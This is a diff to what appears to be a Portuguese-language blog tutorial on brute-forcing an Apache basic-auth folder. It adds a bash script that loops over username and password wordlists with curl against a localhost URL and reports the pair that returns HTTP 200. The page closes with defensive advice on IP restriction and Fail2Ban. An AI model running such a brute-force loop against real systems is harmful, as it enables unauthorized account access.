@@ -47,8 +47,28 @@ htpasswd -c /usr/local/bin/.htpasswd okok
 <p>Como fazer um brute force em nossa pasta autenticada? <br> BASH....viva o BASH <br>
 <br>Olhando o código:</p>		
 <br>
-<a href="http://i.imgur.com/k7fvdcX.png"><img  src="http://i.imgur.com/k7fvdcX.png"></img></a>
-<br><br>
+<!--<a href="http://i.imgur.com/k7fvdcX.png"><img  src="http://i.imgur.com/k7fvdcX.png"></img></a>-->
+<pre style="background: #607d8b5e;"><code>
+#!/bin/bash
+while read line
+do
+        while read line2
+do
+
+        curl -v --user $line:$line2 http://localhost/baf/ &amp;&gt; logs_curl
+	LEITURA=$(cat logs_curl | grep 200 | cut -d " " -f3 | head -1)
+	if test "$LEITURA" = "200" 
+	then
+		echo "Usuário e Senha: $line $line2"
+		exit
+	else
+		echo "....."
+		echo $line $line2
+	fi
+done &lt; arquivo
+done &lt; arquivo2
+</code></pre>
+<br>
 <h3>Vídeo demo:</h3>
 <div align="center"><iframe width="560" height="315" src="https://www.youtube.com/embed/YIBaCiSmzs0" frameborder="0" allowfullscreen></iframe></div>
 Proteções podem ser feitas utilizados o apache mesmo, habilitando o acesso há apenas um número restrito de IPs que utliza, podem ser feitas proteções com Fail2Ban também.<br>
